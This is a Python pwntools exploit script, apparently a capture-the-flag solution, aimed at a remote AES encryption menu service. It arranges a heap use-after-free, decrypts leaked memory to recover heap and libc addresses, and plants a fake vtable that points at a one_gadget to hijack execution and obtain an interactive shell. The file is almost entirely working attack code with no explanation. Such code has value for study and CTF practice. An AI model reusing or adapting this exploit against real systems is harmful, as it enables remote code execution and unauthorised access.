#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from Crypto import Random
from Crypto.Cipher import AES
from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = remote("111.186.63.201", 10001)

p.recvuntil("Choice: ")
wait("1")
def add(idx,option, key, iv , size, data):

    assert len(data)==size
    p.sendline("1")
    p.recvuntil("id : ")
    p.sendline(str(idx))
    p.recvuntil("(2): ")
    p.sendline(str(option))
    p.recvuntil("Key : ")
    p.send(key) #32
    p.recvuntil("IV : ")
    p.send(iv)
    p.recvuntil("Data Size : ")
    p.sendline(str(size))
    p.recvuntil("Data : ")
    p.send(data)
    p.recvuntil("Choice: ")

def delete(idx):

    p.sendline("2")
    p.recvuntil("id : ")
    p.sendline(str(idx))


def deleteauto(idx):

    p.sendline("2")
    p.sendline(str(idx))



def go(idx):

    p.sendline("3")
    p.recvuntil("id : ")
    p.sendline(str(idx))
    p.recvuntil("Prepare...")

add(0, 1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(1, 1, "a"*32, "b"*16, 0x1000, "b"*0x1000)
add(2, 1, "a"*32, "b"*16, 0x100, "c"*0x100)
add(3, 1, "a"*32, "b"*16, 0x100, "d"*0x100)
add(4, 1, "a"*32, "b"*16, 0x50, "e"*0x50)
go(1)
delete(0)
delete(1)
delete(2)
delete(3)
add(5, 1, "a"*32, "b"*16, 0xa0, "f"*0xa0)
add(6, 1, "a"*32, "b"*16, 0x200, "f"*0x200)
p.recvuntil("Ciphertext: \n")
recvpl = ''.join([chr(int(v,16)) for _ in range(4096//16) for v in p.recvline().split()])

print(hexdump(recvpl))

key = "a"*32
iv = "b"*16
cipher = AES.new(key, AES.MODE_CBC, iv)
v = cipher.decrypt(recvpl)
print(hexdump(v))
binary = v[0x58:0x60]
heap = u64(binary)-0x1300
libc = v[0x7a0:0x7a0+8]
libc_addr = u64(libc) - 0x3ebca0
print hex(libc_addr)
one = libc_addr + 0x10a38c

#wash 
    
add(5, 1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(6, 1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(7, 1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(8, 1, "a"*32, "b"*16, 0x100, "a"*0x100)

#go2
add(9,  1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(10, 1, "a"*32, "b"*16, 0x100, "a"*0x100)
add(11, 1, "a"*32, "b"*16, 0x100, "X"*0x100)
add(12, 1, "a"*32, "b"*16, 0x100, "a"*0x100)

payload = ("say2"*4 + p64(0x00000010000001ab) + p64(0x0000001000000020) + p64(0x0000000000001002)+p64(one)*2+p64(0)+p64(0x108)+p64(0)) #fake Vtable
payload = payload.ljust(0x100, "\0")
add(13, 1, "a"*32, "b"*16, 0x100, payload)

wait("3")
go(11)
delete(9)
delete(10)
delete(11)
delete(12)

add(14, 1, "a"*32, "b"*16, 0xa0, p64(heap+0x3a70)+p64(0)+p64(1)+"b"*32+p64(0)*6+p64(0x20)+p64(0)+p64(heap+0x2ff0)+p64(0x0000000f00000000)+p64(0)*3)

p.interactive()


